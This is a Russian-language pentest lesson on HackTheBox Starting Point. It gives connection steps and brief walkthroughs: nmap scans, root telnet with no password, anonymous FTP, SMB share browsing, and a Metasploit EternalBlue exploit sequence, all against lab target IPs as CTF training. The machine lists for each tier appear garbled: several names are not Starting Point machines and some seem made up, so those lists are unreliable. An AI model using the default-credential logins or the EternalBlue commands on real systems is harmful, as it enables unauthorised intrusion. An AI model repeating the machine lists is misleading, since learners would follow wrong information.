# Занятие 51. HackTheBox Starting Point: все машины категории

## Теория

**HackTheBox (HTB)** — ведущая платформа для практики пентеста. Отличается от THM более сложными и реалистичными машинами.

**Starting Point** — это специальный раздел для новичков с подробными walkthrough-видео и пошаговыми инструкциями. Машины в Starting Point:

- **Tier 0** (самые простые): Meow, Fawn, Dancing, Redeemer
- **Tier 1**: Monaco, Arctic, Bike, Blue
- **Tier 2**: ScriptKiddie, Ignition, Jerry, Pikachu

**Особенности HTB:**
- Машины меняются (retire), но Starting Point остается доступным
- Флаги формата: `HTB{...}`
- Очки за прохождение (points) и рейтинг
- Форум с обсуждениями (только после решения машины)

**Подключение:**
1. Регистрация на hackthebox.com
2. Скачивание VPN-файла (Lab → Connection)
3. `sudo openvpn lab_<username>.ovpn`

## Практическое занятие

### Машина: Meow (Tier 0)

**Разведка:**
```bash
nmap -sV -sC <target_ip>
```
Обнаруживаем Telnet (порт 23).

**Атака:**
- Подключаемся: `telnet <target_ip>`
- Пробуем стандартные учетные данные (root без пароля)
- Получаем доступ, читаем `flag.txt`

### Машина: Fawn (Tier 0)

**Разведка:**
```bash
nmap -sV -sC <target_ip>
```
Обнаруживаем FTP (порт 21).

**Атака:**
- Подключаемся: `ftp <target_ip>`
- Анонимный вход (anonymous/anonymous)
- Скачиваем файлы, ищем флаг

### Машина: Dancing (Tier 0)

**Разведка:**
```bash
nmap -sV -sC <target_ip>
```
SMB (порт 445).

**Атака:**
```bash
smbclient -L //<target_ip>/
smbclient //<target_ip>/<share_name>
```
Просматриваем шары, скачиваем флаг.

### Машина: Blue (Tier 1)

**Разведка:**
```bash
nmap -p- --script vuln <target_ip>
```
Обнаруживаем MS17-010 (EternalBlue).

**Атака через Metasploit:**
```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target_ip>
exploit
```

## Задачи для самостоятельного выполнения

1. **Машина "Redeemer"** (Tier 0) — Redis, работа с базой данных
2. **Машина "Arctic"** (Tier 1) — Adobe ColdFusion, эксплуатация веб-уязвимости
3. **Машина "Bike"** (Tier 1) — Node.js, NoSQL-инъекция

> **Совет:** Starting Point дает видео-решения. Смотрите их только после самостоятельной попытки или если застряли более чем на 30 минут.
